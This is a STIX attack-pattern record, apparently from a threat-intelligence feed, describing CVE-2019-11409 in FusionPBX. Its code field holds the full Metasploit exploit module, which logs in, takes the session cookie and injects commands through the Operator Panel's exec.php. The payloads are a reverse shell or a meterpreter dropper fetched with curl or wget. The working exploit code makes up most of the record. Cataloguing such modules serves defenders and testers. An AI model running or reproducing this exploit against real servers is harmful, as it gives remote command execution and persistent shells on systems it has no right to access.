{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2a50846-4466-4afc-883f-23479ee92eff",
    "created": "2024-08-14T17:13:04.435996Z",
    "modified": "2024-08-14T17:13:04.435999Z",
    "name": "FusionPBX Operator Panel exec.php Command Execution",
    "description": " This module exploits an authenticated command injection vulnerability in FusionPBX versions 4.4.3 and prior.  The `exec.php` file within the Operator Panel permits users with `operator_panel_view` permissions, or administrator permissions to execute arbitrary commands as the web server user by sending a `system` command to the FreeSWITCH event socket interface.  This module has been tested successfully on FusionPBX version 4.4.1 on Ubuntu 19.04 (x64).  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec.rb",
            "external_id": "fusionpbx_operator_panel_exec_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11409"
        },
        {
            "source_name": "reference",
            "url": "https://blog.gdssecurity.com/labs/2019/6/7/rce-using-caller-id-multiple-vulnerabilities-in-fusionpbx.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/fusionpbx/fusionpbx/commit/e43ca27ba2d9c0109a6bf198fe2f8d79f63e0611"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'FusionPBX Operator Panel exec.php Command Execution',\n      'Description'     => %q{\n        This module exploits an authenticated command injection vulnerability\n        in FusionPBX versions 4.4.3 and prior.\n\n        The `exec.php` file within the Operator Panel permits users with\n        `operator_panel_view` permissions, or administrator permissions,\n        to execute arbitrary commands as the web server user by sending\n        a `system` command to the FreeSWITCH event socket interface.\n\n        This module has been tested successfully on FusionPBX version\n        4.4.1 on Ubuntu 19.04 (x64).\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Dustin Cobb', # Discovery and exploit\n          'bcoles'       # Metasploit\n        ],\n      'References'      =>\n        [\n          ['CVE', '2019-11409'],\n          ['EDB', '46985'],\n          ['URL', 'https://blog.gdssecurity.com/labs/2019/6/7/rce-using-caller-id-multiple-vulnerabilities-in-fusionpbx.html'],\n          ['URL', 'https://github.com/fusionpbx/fusionpbx/commit/e43ca27ba2d9c0109a6bf198fe2f8d79f63e0611']\n        ],\n      'Platform'        => %w[unix linux],\n      'Arch'            => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Payload'         => {'BadChars' => \"\\x00\\x0a\\x0d\\x27\\x5c\"},\n      'CmdStagerFlavor' => %w[curl wget],\n      'Targets'         =>\n        [\n          ['Automatic (Unix In-Memory)',\n            'Platform'       => 'unix',\n            'Arch'           => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},\n            'Type'           => :unix_memory\n          ],\n          ['Automatic (Linux Dropper)',\n            'Platform'       => 'linux',\n            'Arch'           => [ARCH_X86, ARCH_X64],\n            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},\n            'Type'           => :linux_dropper\n          ]\n        ],\n      'Privileged'      => false,\n      'DefaultOptions'  => { 'SSL' => true, 'RPORT' => 443 },\n      'DisclosureDate'  => '2019-06-06',\n      'DefaultTarget'   => 0))\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to FusionPBX', '/']),\n      OptString.new('USERNAME', [true, 'The username for FusionPBX']),\n      OptString.new('PASSWORD', [true, 'The password for FusionPBX'])\n    ]\n  end\n\n  def login(user, pass)\n    vprint_status \"Authenticating as user '#{user}'\"\n\n    vars_post = {\n      username: user,\n      password: pass,\n      path: ''\n    }\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'core/user_settings/user_dashboard.php'),\n      'vars_post' => vars_post\n    })\n\n    unless res\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    if res.code == 302 && res.headers['location'].include?('login.php')\n      fail_with Failure::NoAccess, \"Login failed for user '#{user}'\"\n    end\n\n    unless res.code == 200\n      fail_with Failure::UnexpectedReply, \"Unexpected HTTP response status code #{res.code}\"\n    end\n\n    cookie = res.get_cookies.to_s.scan(/PHPSESSID=(.+?);/).flatten.first\n\n    unless cookie\n      fail_with Failure::UnexpectedReply, 'Failed to retrieve PHPSESSID cookie'\n    end\n\n    print_good \"Authenticated as user '#{user}'\"\n\n    cookie\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.body.include?('FusionPBX')\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts = {})\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'app/operator_panel/exec.php'),\n      'cookie'  => \"PHPSESSID=#{@cookie}\",\n      'vars_get' => {'cmd' => \"bg_system #{cmd}\"}\n    }, 5)\n\n    unless res\n      return if session_created?\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    unless res.code == 200\n      fail_with Failure::UnexpectedReply, \"Unexpected HTTP response status code #{res.code}\"\n    end\n\n    if res.body.include? 'access denied'\n      fail_with Failure::NoAccess, \"User #{datastore['USERNAME']} does not have permission to access the Operator Panel\"\n    end\n\n    res\n  end\n\n  def exploit\n    unless check == CheckCode::Detected\n      fail_with Failure::NotVulnerable, \"#{peer} - Target is not vulnerable\"\n    end\n\n    @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    print_status \"Sending payload (#{payload.encoded.length} bytes) ...\"\n\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(:linemax => 1_500)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-06-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}